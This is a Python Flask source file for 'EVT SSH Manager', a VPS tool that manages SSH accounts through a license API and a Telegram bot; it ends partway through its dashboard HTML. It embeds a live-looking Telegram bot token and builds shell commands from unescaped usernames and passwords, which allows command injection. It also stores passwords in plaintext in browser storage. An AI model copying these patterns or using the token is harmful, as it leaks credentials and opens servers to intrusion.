#!/usr/bin/env python3
# ============================================
# EVT SSH MANAGER - COMPLETE
# Each VPS works ONLY with its own Telegram ID
# Uses PHP API for license management
# Run: sudo python3 app.py
# ============================================

import os
import sys
import subprocess
import time
import threading
import uuid
import datetime
import json
import logging
import warnings
import re
import glob
import socket
from datetime import date

# Third-party imports
from flask import Flask, request, render_template_string, redirect, url_for, flash, session, jsonify, send_file
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
import requests

# ============================================
# CONFIGURATION
# ============================================

TELEGRAM_BOT_TOKEN = "8531875794:AAH2M3CXbQTZftnmwBAg9ufvJEWouVJ_X0Y"
TELEGRAM_BOT_USERNAME = "evtvpnpro"

# PHP License API URL
LICENSE_API_URL = "https://evtfree.alwaysdata.net/IP/ip_manager.php"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
CONFIG_FILE = "/etc/evt_config"
ACTIVE_SESSIONS_FILE = os.path.join(BASE_DIR, "active_sessions.json")

# ============================================
# COLORS (for terminal output)
# ============================================
CYAN = '\033[0;36m'
GREEN = '\033[0;32m'
RED = '\033[1;31m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
NC = '\033[0m'

# ============================================
# FLASK APP INITIALIZATION
# ============================================
for env in ['WERKZEUG_SERVER_FD', 'WERKZEUG_RUN_MAIN', 'WERKZEUG_LOADED']:
    if env in os.environ:
        del os.environ[env]

os.environ['FLASK_ENV'] = 'production'
os.environ['FLASK_DEBUG'] = '0'
warnings.filterwarnings('ignore')

log = logging.getLogger('werkzeug')
log.disabled = True

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()
app.config['SESSION_COOKIE_NAME'] = 'evt_session'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(days=365)

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# ============================================
# LICENSE SYSTEM (PHP API)
# ============================================

def get_vps_ip():
    """Get current VPS public IP"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    try:
        response = requests.get('https://icanhazip.com', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    try:
        result = subprocess.getoutput("hostname -I | awk '{print $1}'")
        if result:
            return result.strip()
    except:
        pass
    return None

def get_license_from_api(ip=None):
    """Get license info from PHP API by IP"""
    if not ip:
        ip = get_vps_ip()
    if not ip:
        return None
    try:
        response = requests.get(f"{LICENSE_API_URL}?action=getLicense&ip={ip}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('valid'):
                return data.get('data')
        return None
    except:
        return None

def check_license_from_github(target_username=None, target_license=None, target_telegram_id=None):
    """Check license via PHP API"""
    current_ip = get_vps_ip()
    if not current_ip:
        return False, "Cannot detect VPS IP address!", None
    
    try:
        response = requests.get(f"{LICENSE_API_URL}?action=getLicense&ip={current_ip}", timeout=10)
        if response.status_code != 200:
            return False, f"License API error (HTTP {response.status_code})", None
        
        data = response.json()
        if not data.get('valid'):
            return False, data.get('message', 'Invalid license'), None
        
        license_data = data.get('data', {})
        
        # Check username and license if provided
        if target_username and target_license:
            if license_data.get('admin_username') != target_username:
                return False, "Invalid admin username!", None
            if license_data.get('license_key') != target_license:
                return False, "Invalid license key!", None
        
        # Check telegram ID if provided
        if target_telegram_id:
            if str(target_telegram_id) != str(license_data.get('telegram_id')):
                return False, "Telegram ID mismatch!", None
        
        # Check active status
        if not license_data.get('active', True):
            return False, "License is deactivated!", None
        
        # Check expiry
        expiry = license_data.get('expiry')
        if expiry and expiry not in ["No Expiry", "None"]:
            if expiry < datetime.date.today().strftime("%Y-%m-%d"):
                return False, f"License expired on {expiry}!", None
        
        return True, "License valid!", license_data
        
    except requests.exceptions.ConnectionError:
        return False, "Cannot connect to license server!", None
    except Exception as e:
        return False, f"License check error: {str(e)}", None

def get_license_info():
    """Get license info for current VPS"""
    current_ip = get_vps_ip()
    try:
        response = requests.get(f"{LICENSE_API_URL}?action=getLicense&ip={current_ip}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('valid'):
                license_data = data.get('data', {})
                return {
                    'status': 'valid',
                    'vps_ip': license_data.get('vps_ip', current_ip),
                    'expiry': license_data.get('expiry', 'No Expiry'),
                    'admin_username': license_data.get('admin_username', 'Unknown'),
                    'admin_password': license_data.get('admin_password', 'Unknown'),
                    'license_key': license_data.get('license_key', 'N/A'),
                    'limits': license_data.get('limits', 999),
                    'active': True,
                    'telegram_id': license_data.get('telegram_id', None)
                }
    except:
        pass
    
    return {
        'status': 'error',
        'vps_ip': current_ip or 'Unknown',
        'expiry': 'Unknown',
        'admin_username': 'Unknown',
        'admin_password': 'Unknown',
        'license_key': 'Unknown',
        'limits': 999,
        'active': False,
        'telegram_id': None
    }

def get_limit_from_github(license_key):
    """Get limit for current VPS"""
    license_data = get_license_from_api()
    if license_data:
        return license_data.get('limits', 0)
    return 999

# ============================================
# SESSION MANAGEMENT
# ============================================

def get_active_sessions():
    if os.path.exists(ACTIVE_SESSIONS_FILE):
        try:
            with open(ACTIVE_SESSIONS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_active_sessions(sessions):
    try:
        with open(ACTIVE_SESSIONS_FILE, 'w') as f:
            json.dump(sessions, f, indent=4)
    except:
        pass

def cleanup_expired_sessions():
    sessions = get_active_sessions()
    expired = []
    now = datetime.datetime.now()
    TIMEOUT_SECONDS = 60
    
    for session_id, data in sessions.items():
        last_active_str = data.get('last_active') or data.get('login_time', '2026-01-01 00:00:00')
        try:
            last_active = datetime.datetime.strptime(last_active_str, "%Y-%m-%d %H:%M:%S")
            if (now - last_active).total_seconds() > TIMEOUT_SECONDS:
                expired.append(session_id)
        except:
            expired.append(session_id)
    
    for session_id in expired:
        del sessions[session_id]
    
    if expired:
        save_active_sessions(sessions)
    return len(expired)

def add_active_session(sid, license_key, username, ip):
    sessions = get_active_sessions()
    sessions[sid] = {
        'license_key': license_key,
        'username': username,
        'login_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'last_active': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'ip': ip
    }
    save_active_sessions(sessions)

def remove_active_session(sid):
    if sid:
        sessions = get_active_sessions()
        if sid in sessions:
            del sessions[sid]
            save_active_sessions(sessions)

def update_session_heartbeat(sid):
    if sid:
        sessions = get_active_sessions()
        if sid in sessions:
            sessions[sid]['last_active'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_active_sessions(sessions)

def get_active_count_for_license(license_key):
    cleanup_expired_sessions()
    sessions = get_active_sessions()
    count = 0
    for sid, data in sessions.items():
        if data.get('license_key') == license_key:
            count += 1
    return count

# ============================================
# USER MANAGEMENT
# ============================================

def load_keys():
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f:
                data = json.load(f)
                return data.get('keys', data) if isinstance(data, dict) else {}
        except:
            pass
    return {}

def save_keys(keys):
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump({'keys': keys}, f, indent=4)
        return True
    except:
        return False

def sync_user_to_system(username, password, expiry, limit):
    try:
        check = subprocess.run(['id', username], capture_output=True)
        if check.returncode == 0:
            subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True)
        else:
            if expiry and expiry != "No Expiry":
                subprocess.run(['useradd', '-e', expiry, '-M', '-s', '/bin/false', username])
            else:
                subprocess.run(['useradd', '-M', '-s', '/bin/false', username])
            subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True)
        subprocess.run(f"sed -i '/^{username} hard/d' /etc/security/limits.conf", shell=True)
        subprocess.run(f"echo '{username} hard maxlogins {limit}' >> /etc/security/limits.conf", shell=True)
        return True
    except:
        return False

def sync_all_users():
    keys = load_keys()
    synced = 0
    for key, data in keys.items():
        if sync_user_to_system(data.get('username'), data.get('password'), data.get('expiry'), data.get('limit', 1)):
            synced += 1
    return synced

def get_user_online_status(username):
    try:
        pids = subprocess.getoutput(f"pgrep -u {username} 'sshd|dropbear' 2>/dev/null").split()
        online = len(pids) if pids and pids[0] != "" else 0
        return online > 0, online
    except:
        return False, 0

def get_all_online_users():
    try:
        who = subprocess.getoutput("who | awk '{print $1}'")
        dropbear = subprocess.getoutput("ps aux | grep dropbear | grep -v grep | awk '{print $1}'")
        return set((who.split() if who else []) + (dropbear.split() if dropbear else []))
    except:
        return set()

def get_evt_config():
    conf = {'DOMAIN': 'Not Set', 'NS_DOMAIN': 'Not Set'}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                for line in f:
                    if '=' in line:
                        k, v = line.strip().split('=', 1)
                        conf[k.strip().upper()] = v.strip().strip('"')
        except:
            pass
    return conf

def get_live_ports():
    try:
        ports = {}
        ssh = subprocess.getoutput("netstat -tunlp 2>/dev/null | grep LISTEN | grep -E 'sshd|ssh' | awk '{print $4}' | awk -F: '{print $NF}' | head -1").strip()
        ports['SSH'] = ssh if ssh else '22'
        dropbear = subprocess.getoutput("netstat -tunlp 2>/dev/null | grep LISTEN | grep dropbear | awk '{print $4}' | sed 's/.*://' | head -1").strip()
        ports['DROPBEAR'] = dropbear if dropbear else '143,110'
        squid = subprocess.getoutput("netstat -tunlp 2>/dev/null | grep LISTEN | grep squid | awk '{print $4}' | sed 's/.*://' | head -1").strip()
        ports['SQUID'] = squid if squid else '8080,3128'
        stunnel = subprocess.getoutput("netstat -tunlp 2>/dev/null | grep LISTEN | grep stunnel | awk '{print $4}' | sed 's/.*://' | head -1").strip()
        ports['STUNNEL'] = stunnel if stunnel else '443'
        socks = subprocess.getoutput("netstat -tunlp 2>/dev/null | grep LISTEN | grep 2052 | head -1 | awk '{print $4}' | sed 's/.*://'").strip()
        ports['SOCKS'] = socks if socks else '2052'
        return ports
    except:
        return {'SSH': '22', 'DROPBEAR': '143', 'SQUID': '8080', 'STUNNEL': '443', 'SOCKS': '2052'}

def get_slowdns_pubkey():
    pub_files = glob.glob('/etc/dnstt/*.pub')
    if pub_files:
        return subprocess.getoutput(f"cat {pub_files[0]}").strip()
    return 'None'

# ============================================
# TELEGRAM BOT
# ============================================

_cached_license = None
_cache_time = 0

def get_cached_license():
    global _cached_license, _cache_time
    if time.time() - _cache_time > 10:
        _cached_license = get_license_from_api()
        _cache_time = time.time()
    return _cached_license

def is_tgid_authorized(tgid):
    license_data = get_cached_license()
    return license_data and str(license_data.get('telegram_id')) == str(tgid)

def send_tg_msg(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=3)
    except:
        pass

def check_tg_updates():
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={'offset': offset, 'timeout': 20}, timeout=23)
            if resp.status_code == 200:
                for update in resp.json().get('result', []):
                    offset = update['update_id'] + 1
                    msg = update.get('message')
                    if not msg:
                        continue
                    chat_id = msg['chat']['id']
                    user_id = msg['from']['id']
                    text = msg.get('text', '')
                    
                    if not is_tgid_authorized(user_id):
                        continue
                    
                    if text.startswith('/'):
                        parts = text.split()
                        cmd = parts[0].lower()
                        
                        if cmd == '/start':
                            license_data = get_cached_license()
                            send_tg_msg(chat_id, f"🤖 *EVT SSH Manager*\n━━━━━━━━━━━━━━━━\n🖥️ VPS: `{license_data.get('vps_ip') if license_data else 'Unknown'}`\n👤 Admin: `{license_data.get('admin_username') if license_data else 'Admin'}`\n\n📌 Commands:\n/create user pass days limit\n/list\n/info user\n/delete user\n/ports\n/myinfo\n/pubkey")
                        
                        elif cmd == '/create' and len(parts) >= 5:
                            username, password, days, limit = parts[1], parts[2], int(parts[3]), int(parts[4])
                            keys = load_keys()
                            if any(v.get('username') == username for v in keys.values()):
                                send_tg_msg(chat_id, f"❌ Username '{username}' already exists!")
                                continue
                            expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
                            kid = f"EVT-{str(uuid.uuid4())[:8].upper()}"
                            keys[kid] = {'username': username, 'password': password, 'expiry': expiry, 'limit': limit, 'telegram_id': str(user_id), 'created_at': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                            save_keys(keys)
                            sync_user_to_system(username, password, expiry, limit)
                            send_tg_msg(chat_id, f"✅ *User Created*\n👤 {username}\n📅 Expiry: {expiry}\n📱 Limit: {limit}")
                        
                        elif cmd == '/list':
                            keys = load_keys()
                            user_list = [f"• `{d['username']}` | 📅 {d['expiry']}" for k, d in keys.items() if str(d.get('telegram_id')) == str(user_id)]
                            send_tg_msg(chat_id, f"📋 *Your Users*\n━━━━━━━━━━━━━━━━\n" + ("\n".join(user_list[:30]) if user_list else "No users found"))
                        
                        elif cmd == '/info' and len(parts) >= 2:
                            username = parts[1]
                            keys = load_keys()
                            for k, d in keys.items():
                                if d.get('username') == username and str(d.get('telegram_id')) == str(user_id):
                                    online, num = get_user_online_status(username)
                                    send_tg_msg(chat_id, f"🔐 *User: {username}*\n📅 Expiry: {d['expiry']}\n📱 Limit: {d['limit']}\n📶 Online: {num}/{d['limit']}")
                                    break
                            else:
                                send_tg_msg(chat_id, f"❌ User '{username}' not found")
                        
                        elif cmd == '/delete' and len(parts) >= 2:
                            username = parts[1]
                            keys = load_keys()
                            for k, d in list(keys.items()):
                                if d.get('username') == username and str(d.get('telegram_id')) == str(user_id):
                                    subprocess.run(['userdel', '-f', username])
                                    del keys[k]
                                    save_keys(keys)
                                    send_tg_msg(chat_id, f"✅ User '{username}' deleted")
                                    break
                            else:
                                send_tg_msg(chat_id, f"❌ User '{username}' not found")
                        
                        elif cmd == '/ports':
                            ports = get_live_ports()
                            msg = "🔌 *Active Ports*\n━━━━━━━━━━━━━━━━\n" + "\n".join([f"• {k}: `{v}`" for k, v in ports.items()])
                            send_tg_msg(chat_id, msg)
                        
                        elif cmd == '/myinfo':
                            license_data = get_cached_license()
                            conf = get_evt_config()
                            keys = load_keys()
                            user_count = sum(1 for d in keys.values() if str(d.get('telegram_id')) == str(user_id))
                            msg = f"📊 *Server Info*\n━━━━━━━━━━━━━━━━\n🖥️ IP: `{license_data.get('vps_ip')}`\n👤 Admin: `{license_data.get('admin_username')}`\n🌐 Domain: {conf.get('DOMAIN')}\n📡 NS: {conf.get('NS_DOMAIN')}\n📅 Expiry: {license_data.get('expiry')}\n👥 Your Users: {user_count}"
                            send_tg_msg(chat_id, msg)
                        
                        elif cmd == '/pubkey':
                            pubkey = get_slowdns_pubkey()
                            send_tg_msg(chat_id, f"🔑 *Public Key*\n━━━━━━━━━━━━━━━━\n`{pubkey}`")
                        
                        else:
                            send_tg_msg(chat_id, "❌ Unknown command.\nUse: /create, /list, /info, /delete, /ports, /myinfo, /pubkey")
        except:
            pass
        time.sleep(0.5)

def run_telegram_bot():
    while True:
        try:
            requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=2)
            check_tg_updates()
        except:
            pass
        time.sleep(0.5)

# ============================================
# AUTO LIMIT CHECK & KILL
# ============================================

def auto_limit_check():
    while True:
        try:
            valid, _, data = check_license_from_github()
            if valid and data:
                license_key = data.get('license_key')
                limits = data.get('limits', 999)
                active = get_active_count_for_license(license_key)
                if active > limits:
                    sessions = get_active_sessions()
                    to_kill = []
                    for sid, sdata in sessions.items():
                        if sdata.get('license_key') == license_key:
                            to_kill.append((sid, sdata))
                    to_kill.sort(key=lambda x: x[1].get('login_time', ''))
                    for i in range(len(to_kill) - limits):
                        sid, sdata = to_kill[i]
                        remove_active_session(sid)
                        if sdata.get('username'):
                            subprocess.run(f"pkill -9 -u {sdata['username']}", shell=True)
        except:
            pass
        time.sleep(3)

def auto_kill_expired():
    while True:
        try:
            today = datetime.date.today().strftime("%Y-%m-%d")
            keys = load_keys()
            to_delete = []
            for k, v in keys.items():
                expiry = v.get('expiry')
                if expiry and expiry != "No Expiry" and expiry < today:
                    username = v.get('username')
                    if username:
                        subprocess.run(['userdel', '-f', username])
                    to_delete.append(k)
            for k in to_delete:
                del keys[k]
            if to_delete:
                save_keys(keys)
        except:
            pass
        time.sleep(60)

# ============================================
# CLASSES
# ============================================

class Admin(UserMixin):
    def __init__(self, id, username, license_key, admin_username, telegram_id):
        self.id = id
        self.username = username
        self.license_key = license_key
        self.admin_username = admin_username
        self.telegram_id = telegram_id

@login_manager.user_loader
def load_user(user_id):
    if user_id and '|' in user_id:
        parts = user_id.split('|')
        if len(parts) >= 5:
            return Admin(user_id, parts[1], parts[2], parts[3], parts[4])
    return None

# ============================================
# LOGIN HTML
# ============================================
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EVT SSH Manager - Admin Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #FFD700; --bg: #000; --card: #111; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .neon-card { background: var(--card); border: 2px solid var(--gold); border-radius: 20px; padding: 40px; width: 480px; box-shadow: 0 0 30px rgba(255,215,0,0.2); }
        .btn-gold { background: var(--gold); color: #000; font-weight: bold; border-radius: 8px; border: none; padding: 12px; transition: 0.3s; width: 100%; }
        .btn-gold:hover { background: #fff; transform: scale(1.02); }
        .btn-gold:disabled { background: #444; color: #888; cursor: not-allowed; transform: none; }
        .form-control-custom { background: #000 !important; border: 1px solid #444 !important; color: var(--gold) !important; padding: 12px; border-radius: 8px; width: 100%; }
        .form-control-custom:focus { border-color: var(--gold) !important; box-shadow: 0 0 10px rgba(255,215,0,0.3) !important; outline: none; }
        .text-gold { color: var(--gold) !important; }
        .alert { background: #2c2c2c; color: #ff6b6b; border: 1px solid #ff6b6b; }
        .input-group-custom { position: relative; width: 100%; margin-bottom: 20px; }
        .input-group-custom input { padding-left: 45px; width: 100%; }
        .input-group-prepend { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); z-index: 10; color: var(--gold); }
        .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--gold); z-index: 10; background: transparent; border: none; }
        .vps-ip { text-align: center; margin-bottom: 20px; padding: 8px; background: rgba(0,0,0,0.5); border-radius: 8px; font-size: 13px; }
        .vps-ip i { color: var(--gold); margin-right: 5px; }
        .vps-ip span { color: #28a745; font-family: monospace; }
        .session-full { border-color: #dc3545 !important; background: rgba(220,53,69,0.1) !important; }
        .session-warning { border-color: #ffc107 !important; background: rgba(255,193,7,0.07) !important; }
        .session-ok { border-color: #28a745 !important; background: rgba(40,167,69,0.1) !important; }
        .text-danger { color: #dc3545 !important; }
        .text-warning { color: #ffc107 !important; }
        .text-success { color: #28a745 !important; }
    </style>
</head>
<body>
    <div class="neon-card">
        <div class="text-center mb-3">
            <img src="https://raw.githubusercontent.com/snaymyo/logo/refs/heads/main/evt.png" alt="EVT Logo" style="width: 70px; border-radius: 12px;">
            <h3 class="text-gold fw-bold mt-2">EVT SSH MANAGER</h3>
            <p class="text-secondary small">Admin Login</p>
        </div>
        <div class="vps-ip">
            <i class="fas fa-globe"></i> Your VPS IP: <span id="detectedIp">Loading...</span>
        </div>
        <div class="vps-ip" id="session-status-box">
            <i class="fas fa-users"></i> Active Sessions: 
            <span id="session-count-display" class="fw-bold">0/?</span>
            <span id="session-status-text" class="ms-2 small"></span>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="alert alert-{{ category }} py-2 small mb-3">{{ message|safe }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        <form method="POST" id="loginForm">
            <div class="input-group-custom">
                <span class="input-group-prepend"><i class="fas fa-user-shield"></i></span>
                <input type="text" name="admin_username" id="admin_username" class="form-control-custom" placeholder="Admin Username" required autocomplete="off">
            </div>
            <div class="input-group-custom">
                <span class="input-group-prepend"><i class="fas fa-lock"></i></span>
                <input type="password" name="admin_password" id="admin_pass" class="form-control-custom" placeholder="Admin Password" required>
                <i class="fas fa-eye toggle-password" onclick="togglePass()"></i>
            </div>
            <div class="input-group-custom">
                <span class="input-group-prepend"><i class="fas fa-key"></i></span>
                <input type="text" name="license_key" id="license_key" class="form-control-custom" placeholder="License Key" required autocomplete="off">
            </div>
            <div class="form-check mb-3">
                <input class="form-check-input" type="checkbox" name="remember" id="remember">
                <label class="form-check-label text-secondary small" for="remember">Remember login info</label>
            </div>
            <button type="submit" class="btn-gold" id="login-btn">
                <i class="fas fa-sign-in-alt" id="login-btn-icon"></i>
                <span id="login-btn-text">LOGIN</span>
            </button>
            <p class="text-danger small text-center mt-2" id="limit-msg" style="display:none"></p>
        </form>
        <div class="mt-3 text-center">
            <small class="text-secondary">© 2026 EVT SSH Manager | Contact: @evtvpnpro</small>
        </div>
    </div>
    <script>
        let sessionCheckTimer = null;
        
        function togglePass() {
            let field = document.getElementById('admin_pass');
            let icon = event.target;
            if (field.type === "password") {
                field.type = "text";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
            } else {
                field.type = "password";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
            }
        }
        
        function updateSessionDisplay(licenseKey) {
            if (!licenseKey || licenseKey.trim() === '') {
                document.getElementById('session-count-display').textContent = '0/?';
                document.getElementById('session-count-display').className = 'fw-bold text-secondary';
                document.getElementById('session-status-text').textContent = '';
                document.getElementById('session-status-box').className = 'vps-ip';
                enableLoginButton(true);
                return;
            }
            
            fetch('/api/session_count?license_key=' + encodeURIComponent(licenseKey))
                .then(res => res.json())
                .then(data => {
                    const active = data.active;
                    const limit = data.limit;
                    const display = document.getElementById('session-count-display');
                    const statusText = document.getElementById('session-status-text');
                    const box = document.getElementById('session-status-box');
                    const limitMsg = document.getElementById('limit-msg');
                    
                    if (limit > 0) {
                        display.textContent = active + '/' + limit;
                    } else {
                        display.textContent = active + '/?';
                    }
                    
                    if (limit > 0 && active >= limit) {
                        display.className = 'fw-bold text-danger';
                        statusText.textContent = '🔴 Session limit reached';
                        statusText.style.color = '#dc3545';
                        box.className = 'vps-ip session-full';
                        limitMsg.textContent = 'License limit exceeded (' + active + '/' + limit + '). Cannot login.';
                        limitMsg.style.display = 'block';
                        enableLoginButton(false);
                    } else if (limit > 0 && active > 0) {
                        display.className = 'fw-bold text-warning';
                        statusText.textContent = '⚠️ ' + active + '/' + limit + ' Active';
                        statusText.style.color = '#ffc107';
                        box.className = 'vps-ip session-warning';
                        limitMsg.style.display = 'none';
                        enableLoginButton(true);
                    } else {
                        display.className = 'fw-bold text-success';
                        statusText.textContent = '✅ Ready to login';
                        statusText.style.color = '#28a745';
                        box.className = 'vps-ip session-ok';
                        limitMsg.style.display = 'none';
                        enableLoginButton(true);
                    }
                })
                .catch(err => {
                    console.error('Session check error:', err);
                    document.getElementById('session-count-display').textContent = '0/?';
                });
        }
        
        function enableLoginButton(enabled) {
            const btn = document.getElementById('login-btn');
            const btnIcon = document.getElementById('login-btn-icon');
            const btnText = document.getElementById('login-btn-text');
            
            if (enabled) {
                btn.disabled = false;
                btn.style.background = '';
                btn.style.color = '';
                btnIcon.className = 'fas fa-sign-in-alt';
                btnText.textContent = 'LOGIN';
            } else {
                btn.disabled = true;
                btn.style.background = '#444';
                btn.style.color = '#888';
                btnIcon.className = 'fas fa-ban';
                btnText.textContent = 'LIMIT REACHED';
            }
        }
        
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                document.getElementById('detectedIp').innerHTML = data.ip;
            })
            .catch(() => {
                document.getElementById('detectedIp').innerHTML = 'Cannot detect';
            });
        
        const licenseInput = document.getElementById('license_key');
        if (licenseInput) {
            licenseInput.addEventListener('input', function() {
                const key = this.value.trim();
                clearTimeout(sessionCheckTimer);
                if (key.length > 5) {
                    sessionCheckTimer = setTimeout(() => updateSessionDisplay(key), 500);
                } else if (key.length === 0) {
                    updateSessionDisplay('');
                }
            });
            
            if (licenseInput.value.trim().length > 5) {
                updateSessionDisplay(licenseInput.value.trim());
            }
        }
        
        const loginForm = document.getElementById('loginForm');
        const userField = document.getElementById('admin_username');
        const passField = document.getElementById('admin_pass');
        const keyField = document.getElementById('license_key');
        const rememberCheck = document.getElementById('remember');
        
        document.addEventListener('DOMContentLoaded', function() {
            const savedData = localStorage.getItem('evt_login_cache');
            if (savedData) {
                try {
                    const data = JSON.parse(savedData);
                    userField.value = data.username || '';
                    passField.value = data.password || '';
                    keyField.value = data.license_key || '';
                    rememberCheck.checked = true;
                    if (keyField.value.trim().length > 5) {
                        setTimeout(() => updateSessionDisplay(keyField.value.trim()), 100);
                    }
                } catch (e) {
                    console.error("Error loading saved login info:", e);
                }
            }
        });
        
        loginForm.addEventListener('submit', function() {
            if (rememberCheck.checked) {
                const data = {
                    username: userField.value,
                    password: passField.value,
                    license_key: keyField.value,
                    saved_at: new Date().toISOString()
                };
                localStorage.setItem('evt_login_cache', JSON.stringify(data));
            } else {
                localStorage.removeItem('evt_login_cache');
            }
        });
        
        setInterval(function() {
            const key = keyField ? keyField.value.trim() : '';
            if (key.length > 5) {
                updateSessionDisplay(key);
            }
        }, 3000);
    </script>
</body>
</html>
"""

# ============================================
# DASHBOARD HTML
# ============================================
DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EVT SSH Manager - Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #FFD700; --bg: #000; --card: #111; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; }
        .top-logout-btn { position: absolute; top: 20px; right: 20px; z-index: 1000; background: rgba(220,53,69,0.1); border: 1px solid #dc3545; color: #dc3545; padding: 8px 15px; border-radius: 8px; text-decoration: none; font-weight: bold; transition: all 0.3s ease; display: flex; align-items: center; gap: 8px; }
        .top-logout-btn:hover { background: #dc3545; color: #fff; box-shadow: 0 0 15px rgba(220,53,69,0.4); transform: translateY(-2px); }
        @media (max-width: 576px) { .top-logout-btn { top: 10px; right: 10px; padding: 5px 10px; font-size: 12px; } }
        .logo-center { text-align: center; margin-bottom: 20px; margin-top: 20px; }
        .logo-center img { width: 150px; height: 150px; border-radius: 15px; border: 2px solid var(--gold); box-shadow: 0 0 20px rgba(255,215,0,0.4); transition: transform 0.3s; }
        .logo-center img:hover { transform: scale(1.05); }
        .main-title { font-size: 72px; font-weight: 900; color: #FFD700; text-transform: uppercase; letter-spacing: 8px; text-shadow: 0 0 25px rgba(255,215,0,0.7); margin-bottom: 10px; }
        .sub-title { font-size: 20px; color: #FFD700; letter-spacing: 2px; font-weight: 400; margin-bottom: 5px; }
        .region-time { font-size: 16px; color: #FFD700; letter-spacing: 1px; font-family: monospace; margin-top: 5px; padding: 8px 20px; background: rgba(0,0,0,0.5); display: inline-block; border-radius: 30px; border: 1px solid rgba(255,215,0,0.3); }
        .region-time i { margin-right: 8px; color: var(--gold); }
        .neon-card { background: var(--card); border: 1px solid #333; border-radius: 15px; padding: 20px; margin-bottom: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .btn-gold { background: var(--gold); color: #000; font-weight: bold; border-radius: 8px; border: none; padding: 10px 20px; transition: 0.3s; }
        .btn-gold:hover { background: #fff; transform: scale(1.02); }
        .btn-edit { background: #2c3e50; color: var(--gold); border: 1px solid var(--gold); border-radius: 8px; padding: 5px 15px; font-size: 12px; transition: 0.3s; margin-left: 10px; }
        .btn-edit:hover { background: var(--gold); color: #000; }
        .form-control-custom { background: #000 !important; border: 1px solid #444 !important; color: var(--gold) !important; padding: 12px; border-radius: 8px; }
        .form-control-custom:focus { border-color: var(--gold) !important; box-shadow: 0 0 10px rgba(255,215,0,0.3) !important; }
        .table-scroll { max-height: 450px; overflow-y: auto; border: 1px solid #333; border-radius: 10px; }
        .table-scroll::-webkit-scrollbar { width: 6px; }
        .table-scroll::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 10px; }
        .table { width: 100%; margin: 0; background: transparent !important; color: #fff !important; }
        .table thead th { background: #1a1a1a !important; color: var(--gold); padding: 15px; position: sticky; top: 0; border-bottom: 1px solid #333; }
        .table tbody tr { background: transparent !important; transition: background 0.3s ease; }
        .table tbody td { background: transparent !important; padding: 12px 15px; border-bottom: 1px solid #222; vertical-align: middle; }
        .table tbody tr:hover { background: rgba(255,215,0,0.05) !important; }
        .text-gold { color: var(--gold) !important; }
        .username-cell { font-size: 20px !important; font-weight: bold; color: #FFD700 !important; }
        .password-cell { font-size: 18px !important; font-family: monospace; font-weight: bold; color: #00ff00 !important; }
        .expiry-cell { font-size: 18px !important; font-weight: bold; color: #FFD700 !important; }
        .device-cell { font-size: 18px !important; font-weight: bold; color: #FFFFFF !important; }
        .device-online { color: #28a745; animation: pulse 1.5s infinite; }
        .device-offline { color: #FFD700; }
        .device-limit { color: #ff6b6b; animation: shake 0.5s infinite; }
        .status-online { background: #28a745; color: #fff; padding: 4px 10px; border-radius: 20px; font-size: 14px; display: inline-block; animation: pulse 1.5s infinite; }
